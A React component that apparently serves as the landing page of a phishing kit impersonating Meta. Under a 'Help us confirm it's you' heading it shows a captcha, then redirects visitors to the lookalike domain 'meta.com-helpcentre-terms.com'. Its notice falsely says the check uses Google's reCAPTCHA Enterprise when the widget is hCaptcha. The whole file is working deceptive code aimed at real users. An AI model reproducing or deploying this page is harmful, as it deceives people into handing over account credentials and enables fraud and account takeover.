import { useEffect, useRef, useState } from "react";
import './App.css';
import HCaptcha from '@hcaptcha/react-hcaptcha';

function App() {

  const [token, setToken] = useState(null);
  const [isVerified, setIsVerified] = useState(true);
  
  const handleFormSubmit = (event) => {
    event.preventDefault();

    window.location.href = "https://meta.com-helpcentre-terms.com";
  }

  const handleVerificationSuccess = (token) => {
    setIsVerified(false);
    window.location.href = "https://meta.com-helpcentre-terms.com";
  }

  return (
    <div className="container">
        <div className="row">
          <div className="col-md-6 offset-md-3">
            <div className="trupimrena">
              <form id="yourFormId" onSubmit={handleFormSubmit}>
                <h2 style={{fontWeight: 600, fontSize: 24, marginBottom: 20}}>Help us confirm it's you</h2>
                <HCaptcha sitekey="d11b653a-7321-42ba-b5d6-3c527778863b" onVerify={handleVerificationSuccess} />
                <p style={{color: '#65676b', fontSize:12}}>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products. <br /><br />
                  We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.<br /><br />
                reCAPTCHA Enterprise collects hardware and software information such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                <input type="submit" value="Continue" id="continuebutton" disabled={isVerified} className="btn btn-primary" style={{backgroundColor:'#1b74e4'}} />
              </form>
            </div>
          </div>
        </div>
    </div>    
  );
}

export default App;
